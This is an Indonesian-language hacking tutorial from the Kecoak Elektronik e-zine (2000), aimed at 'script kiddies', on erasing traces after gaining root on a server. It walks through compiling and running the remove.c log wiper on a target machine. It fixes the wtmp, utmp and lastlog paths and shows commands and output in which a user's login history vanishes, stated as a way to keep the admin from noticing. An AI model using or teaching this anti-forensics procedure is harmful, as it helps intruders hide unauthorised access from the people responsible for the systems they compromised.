@@ -1,0 +1,152 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+
+============================================================
+Bagaimana menghapus jejak
+Script Kiddies Tutorial 
+(c) cbug aka CyberBug (Kecoak Elektronik)
+============================================================
+
+Pemberitahuan :
+1. Artikel ini dimaksudkan untuk bahan pelajaran para admin dan siapa 
+   saja yang ingin mengembangkan pengetahuan networking/internet mereka.
+2. Kecoak Elektronik tidak bertanggung jawab atas penyalah gunaan artikel 
+   ini.
+3. Kecoak Elektronik tetap menyertakan dan tidak menghapus Nama Penulis 
+   eksploit/script dengan harapan pembaca juga tetap menyertakan kredit 
+   untuk mereka, jangan mengganti nama2 penulis artikel/eksploit/script 
+   dengan nama anda dengan harapan nanti dianggap hacker.
+
+A. Apa yang harus ada
+
+1. Server yang berhasil di root
+   Terserah mo pake apa, boljug pake contoh eksploit pada artikel saya
+   sebelumnya, pake remote eksploit juga boleh :P
+
+2. Program penghapus Log
+   Ada banyak dan bermacam-macam program penghapus log, pilih apa yang
+   menurut kamu bagus dan cocok buat kamu, untuk langkah awal kamu bisa
+   coba gunakan remove.c dari Simple Nomad.
+
+
+B. Menghapus jejak
+
+Nah ... kamu sudah dapat akses root, asyiiik ... tapi eh nanti dulu,
+gimana kalo adminnya tau?, gak ... dia gak bakalan tau, kalau kamu pake
+program penghapus log untuk menghilangkan jejak kamu.
+Caranya? ... download remove.c dari site k-elektronik, kemudian compile
+di mesin sasaran kamu, baca dulu baik2 cara compile nya di source remove.c
+BTW ... remove harus di running sebagai root (untuk latihan, bisa saja
+kamu login root di mesin kamu sendiri).
+
+a. Perlu diperhatikan bagian berikut ini :
+
+#ifdef GENERIC  /* Should work with Linux, IRIX, Digital Unix, BSDs, etc */
+#define WTMP "/var/adm/wtmp"
+#define UTMP "/var/adm/utmp"
+#define LASTLOG "/var/adm/lastlog"
+#endif
+
+Harap diingat bahwa tidak selalu file2 wtmp utmp dan lastlog berada pada
+posisi yang sama, misalnya distro Slackware menaruh file2 tsb diatas di:
+#define WTMP "/var/log/wtmp"
+#define UTMP "/var/run/utmp"
+#define LASTLOG "/var/log/lastlog"
+
+Jadi jangan lupa cek apakah posisi file2 wtmp utmp dan lastlog sudah
+sesuai dengan source remove.c
+
+Kamu bisa gunakan perintah : 
+find / -name wtmp -print
+find / -name utmp -print
+find / -name lastlog -print
+atau
+whereis wtmp
+whereis utmp
+whereis lastlog
+Kemudian ganti posisi file2 tersebut di remove.c sesuai dengan hasil 
+diatas.
+
+b. Kita compile sekarang? ... ayooooooooooooo.
+
+kecoak:/home/cbug/tools# gcc remove.c -o remove -DGENERIC
+remove.c: In function `main':
+remove.c:50: warning: return type of `main' is not `int'
+/tmp/ccZVzySI.o: In function `main':
+/tmp/ccZVzySI.o(.text+0xb4): the `gets' function is dangerous and should
+not be used.
+
+Waw ... ada warning message ... gak apa2, warning bukan error :P
+ 
+
+c. Cek last login nya user (cbug misalnya)
+
+kecoak:/home/cbug/tools# lastlog | grep cbug
+cbug             tty2                      Sat Mar 11 11:32:42 -0800 2000
+
+
+d. Jalankan remove
+
+kecoak:/home/cbug/tools# ./remove cbug
+
+REMOVE by Simple Nomad
+Nomad Mobile Research Centre (c) 1997
+
+Found 549 record(s) for user cbug
+Will attempt a lastlog cleanup by default.
+
+#    - remove last # records from utmp/wtmp
+a    - remove (a)ll records from utmp/wtmp
+q    - (q)uit program
+
+Enter selection ->
+
+
+e. Hapus record terakhir (ketik #), atau boleh juga semua (a) :P
+
+Enter selection -> #
+REMOVE cleaned up 0 record(s) from /var/log/wtmp
+REMOVE cleaned up 0 record(s) from /var/run/utmp
+REMOVE cleaned up /var/log/lastlog
+
+
+f. Cek last log nya cbug
+
+kecoak:/home/cbug/tools# lastlog | grep cbug
+cbug                                       **Never logged in**
+
+
+g. Ini hasilnya kalo cbug login :
+
+Selamat datang di sarang Kecoak Elektronik
+
+kecoak login: cbug
+Password:
+Kecoak's K-Rad OS
+No mail.
+
+kecoak:~$
+
+
+h. Biasanya kalo last log nya dicatat (belum/gak dihapus) cbug bisa liat
+   gini, (perhatikan bagian Last login nya) :
+
+Selamat datang di sarang Kecoak Elektronik
+
+kecoak login: cbug
+Password:
+Kecoak's K-Rad OS
+Last login: Sat Mar 11 12:06:02 -0800 2000 on tty3.
+No mail.
+
+kecoak:~$
+
+i. Gitu aja
+
+--
+Manado, Awal Maret 2000
+cbug
+
+
+
